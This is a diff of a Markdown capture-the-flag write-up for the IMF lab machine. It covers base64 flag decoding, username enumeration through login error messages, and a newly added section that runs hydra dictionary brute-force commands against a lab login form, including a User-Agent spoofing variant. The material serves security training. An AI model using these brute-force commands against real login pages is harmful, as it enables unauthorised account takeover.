@@ -56,29 +56,35 @@ In desperation - I decided to view page html source for any hints and got the fi
 
 Looks like base64, let's decrypt:
 
-    echo YWxsdGhlZmlsZXM= | base64 --decode
-    allthefiles
+```bash
+echo YWxsdGhlZmlsZXM= | base64 --decode
+allthefiles
+```
 
 Back to the browser - http://172.16.1.76/allthefiles - 404. I've tried several extenions (html, txt, etc) with no luck. Back to the html I guess..
 
 Suspicous js files in html head:
 
-    <script src="js/ZmxhZzJ7YVcxbVl.js"></script>
-    <script src="js/XUnRhVzVwYzNS.js"></script>
-    <script src="js/eVlYUnZjZz09fQ==.min.js"></script>
+```html
+<script src="js/ZmxhZzJ7YVcxbVl.js"></script>
+<script src="js/XUnRhVzVwYzNS.js"></script>
+<script src="js/eVlYUnZjZz09fQ==.min.js"></script>
+```
 
 `eVlYUnZjZz09fQ==.min.js` sticks out since it looks like base64 off the bat.
 
 At first I thought the rest could be some backend js caching but let's just try all three:
-    
-    echo ZmxhZzJ7YVcxbVl | base64 --decode
-    flag2{aW1mY
-    
-    echo XUnRhVzVwYzNS | base64 --decode
-    base64: invalid input
-    
-    echo eVlYUnZjZz09fQ== | base64 --decode
-    yYXRvcg==}
+
+```bash
+echo ZmxhZzJ7YVcxbVl | base64 --decode
+flag2{aW1mY
+
+echo XUnRhVzVwYzNS | base64 --decode
+base64: invalid input
+
+echo eVlYUnZjZz09fQ== | base64 --decode
+yYXRvcg==}
+```
 
 Looks looks like i have to concatenate the two successful decodes to get the flag:
 
@@ -90,11 +96,13 @@ and one more decode gives me this somewhat garbled text which resembles the CTF 
     
 So it seems like the input is close but not the exact string I need. After serveral attempts at combining strings, I ended up with this (which was the most obvious), `ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==`
 
-    echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 --decode
-    flag2{aW1mYWRtaW5pc3RyYXRvcg==}
-    
-    echo aW1mYWRtaW5pc3RyYXRvcg== | base64 --decode
-    imfadministratorbase64
+```bash
+echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 --decode
+flag2{aW1mYWRtaW5pc3RyYXRvcg==}
+
+echo aW1mYWRtaW5pc3RyYXRvcg== | base64 --decode
+imfadministratorbase64
+```
 
 Okay, back to the browser with our findings:
 
@@ -109,15 +117,15 @@ I tried some dummy data for username and password. Two things I noticed about th
 2. Uses a phpsessid.
 
 In burpsuite, the "failed login" page's response gives us a nice note from the develoer (also could probably be Roger S. Michaels - the director):
-
-    Invalid username.
-    <form method="POST" action="">
-    <label>Username:</label><input type="text" name="user" value=""><br />
-    <label>Password:</label><input type="password" name="pass" value=""><br />
-    <input type="submit" value="Login">
-    <!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
-    </form>
-
+```html
+Invalid username.
+<form method="POST" action="">
+<label>Username:</label><input type="text" name="user" value=""><br />
+<label>Password:</label><input type="password" name="pass" value=""><br />
+<input type="submit" value="Login">
+<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
+</form>
+```
 
 At this point it looks like this is the form I'd have to exploit to get the rest of the flags.
 
@@ -141,3 +149,46 @@ In burpsuite, I tested the following usernames to see if if the "Invalid usernam
     estone: Invalid username.
     
 Got a hit on Roger S. Michaels's username. 
+
+### Bruteforce
+
+I'll try to brute force Roger's account using hydra and a list built into kali at `/usr/share/wordlists/*`. I'll start with the popular rockyou list. I was able to craft a http-form-post string in hydra thanks to Burpsuite and [this tutorial](http://insidetrust.blogspot.com/2011/08/using-hydra-to-dictionary-attack-web.html).
+
+```bash
+cd /usr/share/wordlists/
+gunzip ./rockyou.txt.gz
+
+hydra 172.16.1.76 http-form-post "/imfadministrator:user=^USER^&pass=^PASS^:Invalid password" -l rmichaels -P /usr/share/wordlists/rockyou.txt
+```
+The problem I have now is that I keep on getting different results when I run and a whole bunch of false positives. This could be brute force protection behind the server or the login attempts are coming in too fast for the server to respond with the correct "Invalid password" string.  After throttling the threads down to 1, I still get false positives. I'm guessing there's some type of protection against brute forcing. I need to see the http response when hydra is being ran. It looks like I should be able to use Hydra through a proxy, but I can find solid documenation on how to do that from the command line. So I'll just fire up Wireshark to follow the http streams. Here's the conversation:
+
+```
+GET /imfadministrator HTTP/1.0
+Cookie: PHPSESSID=8qicfn6g1dneig1p7ro06i10g4
+Host: 192.168.100.76
+User-Agent: Mozilla/5.0 (Hydra)
+
+HTTP/1.1 301 Moved Permanently
+Date: Wed, 09 Nov 2016 00:31:35 GMT
+Server: Apache/2.4.18 (Ubuntu)
+Location: http://192.168.100.76/imfadministrator/
+Content-Length: 327
+Connection: close
+Content-Type: text/html; charset=iso-8859-1
+
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>301 Moved Permanently</title>
+</head><body>
+<h1>Moved Permanently</h1>
+<p>The document has moved <a href="http://192.168.100.76/imfadministrator/">here</a>.</p>
+<hr>
+<address>Apache/2.4.18 (Ubuntu) Server at 192.168.100.76 Port 80</address>
+</body></html>
+
+```
+
+So it looks like I'm being given a 301 error when logging in through hydra. Possibly being blocked due to Hydras user-agent.
+```
+hydra -l rmichaels -P /usr/share/wordlists/rockyou.txt 192.168.100.76 http-form-post "/imfadministrator:user^USER^&pass=^PASS^:Invalid:H=Cookie: PHPSESSID=8qicfn6g1dneig1p7ro06i10g4; User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 9_2_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13D15 Safari/601.1" -t 1
+```
